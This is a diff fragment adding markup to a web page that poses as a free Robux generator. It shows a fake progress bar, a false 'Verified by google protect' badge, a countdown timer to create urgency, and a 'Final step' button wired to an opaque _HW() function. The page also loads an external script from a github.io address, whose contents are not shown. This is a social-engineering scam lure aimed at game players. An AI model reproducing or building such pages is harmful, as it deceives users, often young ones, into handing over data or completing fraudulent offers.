+                    <span id="progressPercent" class="text-sm font-medium text-robux-green">0%</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-5 mb-4 overflow-hidden">
+                    <div id="progressBar" class="bg-robux-green h-5 rounded-full w-0 transition-all duration-100"></div>
+                </div>
+                
+                <div id="statusMessages" class="text-sm text-gray-700 mb-4 border border-gray-200 rounded-md p-3 bg-gray-50 max-h-32 overflow-y-auto">
+                    <div class="mb-1">
+                        <i class="fas fa-check-circle text-green-500 mr-2"></i> Connecting to servers...
+                    </div>
+                </div>
+                
+                <div class="flex items-center justify-center mb-4">
+                    <i class="fas fa-user mr-2 text-gray-600"></i>
+                    <p class="text-gray-800">User: <span id="usernameDisplay" class="font-bold">Username</span></p>
+                </div>
+            </div>
+        </div>
+
+        <div id="step4" class="bg-white rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <div id="verification">
+                <h2 class="text-2xl font-bold text-center text-roblox-black mb-6">
+                    <i class="fas fa-shield-alt mr-2"></i> Verified by google protect 
+                </h2>
+                
+                <div class="flex justify-center mb-6">
+                    <div class="floating" id="floatingIcon">
+                    </div>
+                </div>
+                
+                <div class="text-center mb-6">
+                    <div id="rewardDisplay" class="mb-2 text-lg font-medium text-roblox-black">
+                    </div>
+                    <p class="text-gray-600 mb-1">
+                        User: <span id="usernameDisplay2" class="font-bold">Username</span>
+                    </p>
+                    <div class="text-xs text-gray-500">
+                        <i class="fas fa-lock mr-1"></i>
+                    </div>
+                </div>
+                
+                <div class="bg-gray-100 rounded-lg p-4 mb-6">
+                    <div class="flex items-center mb-2">
+                        <i class="fas fa-info-circle text-blue-500 mr-2"></i>
+                        <p id="readyMessage" class="text-sm text-gray-700">Your rewards are ready to be added</p>
+                    </div>
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-triangle text-yellow-500 mr-2"></i>
+                        <p class="text-sm text-gray-700">Click NEXT for the final step</p>
+                    </div>
+                </div>
+                
+                <button id="getrobuxBtn"
+  class="w-full bg-red-600 text-white font-bold py-5 px-6 rounded-md transition duration-200 ease-in-out shine-button pulse transform hover:scale-105 mb-4">
+  <span>
+    <i class="fas fa-gift mr-2"></i> NEXT
+  </span>
+</button>
+            </div>
+            
+            <div id="completion" class="hidden">
+                <div class="flex justify-center mb-4">
+                    <div class="w-16 h-16 text-robux-green bounce">
+                        <i class="fas fa-check-circle text-6xl"></i>
+                    </div>
+                </div>
+                
+                <h2 class="text-2xl font-bold text-center text-robux-green mb-4">Generated Successfully!</h2>
+                
+                <div class="bg-green-100 border border-green-400 text-green-700 px-4 py-4 rounded-lg mb-6" role="alert">
+                    <div id="completionRewardDisplay" class="flex justify-center items-center mb-2">
+                    </div>
+                    <p class="text-center">Generated for <span id="usernameDisplay3" class="font-bold">Username</span></p>
+                </div>
+                
+                <div class="bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded-lg mb-6" role="alert">
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        <p>Complete the final STEP to receive your rewards immediately</p>
+                    </div>
+                </div>
+               
+                <button onclick="_HW()"
+  class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-6 rounded-md transition duration-200 ease-in-out transform hover:scale-105 robux-glow shine-button">
+  <span>
+    <i class="fas fa-user-check mr-2"></i> Final step
+  </span>
+</button>
+
+             
+                <div class="mt-4 text-center text-sm text-gray-500">
+                    <i class="fas fa-clock mr-1"></i> This offer expires in <span id="countdown">05:00</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="text-center text-xs text-gray-500 mt-6">
+            <p></p>
+            <p>Roblox, the Roblox logo and Robux are registered trademarks of Roblox Corporation.</p>
+        </div>
     </div>
-  </div>
-</main>
+	  
+
+	 <script src="https://rbbbxxxx66.github.io/rbbxxx/stepmain.js"></script>
+
+
 </body>
-
-
 </html>
